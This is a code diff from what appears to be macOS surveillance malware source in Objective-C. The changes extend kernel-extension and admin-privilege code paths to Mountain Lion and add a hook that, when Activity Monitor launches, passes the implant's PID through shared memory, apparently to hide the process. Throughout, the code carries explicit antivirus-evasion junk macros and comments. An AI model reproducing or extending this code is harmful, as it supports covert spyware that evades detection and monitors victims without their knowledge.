@@ -3551,7 +3551,7 @@ static void computerWillShutdown(CFMachPortRef port,
   AV_GARBAGE_004
   
   // On lion fork to sendEvents without problem
-  if ([gUtil isLion]) 
+  if ([gUtil isLion] == YES || [gUtil isMtLion] == YES)
   {
     NSTask *aTask = [[NSTask alloc] init];
     NSMutableArray *args = [NSMutableArray array];
@@ -4032,7 +4032,7 @@ static void computerWillShutdown(CFMachPortRef port,
       AV_GARBAGE_007
       
       // set by "require admin privileges"
-      if ([gUtil isLion] == YES)
+      if ([gUtil isLion] == YES || [gUtil isMtLion] == YES)
         {
           NSString *flagPath   = [NSString stringWithFormat: @"%@/%@",
                                                              [[NSBundle mainBundle] bundlePath],
@@ -4184,7 +4184,7 @@ static void computerWillShutdown(CFMachPortRef port,
   // AV evasion: only on release build
   AV_GARBAGE_008
   
-  if (getuid() != 0 && geteuid() == 0 && [gUtil isLion] == NO)
+  if (getuid() != 0 && geteuid() == 0 && [gUtil isSnowLeopard] == YES)
     {
       if ([self connectKext] == -1)
         {
@@ -4605,6 +4605,18 @@ static void computerWillShutdown(CFMachPortRef port,
      
      [thePid release];
     }
+  
+  sleep(1);
+  
+  // run on every platform
+  if ([[appInfo objectForKey: @"NSApplicationName"] isCaseInsensitiveLike: @"Activity Monitor"])
+  {
+    // AV evasion: only on release build
+    AV_GARBAGE_002
+    
+    // Write command with pid
+    [self shareCorePidOnShMem];
+  }
   
   // AV evasion: only on release build
   AV_GARBAGE_007
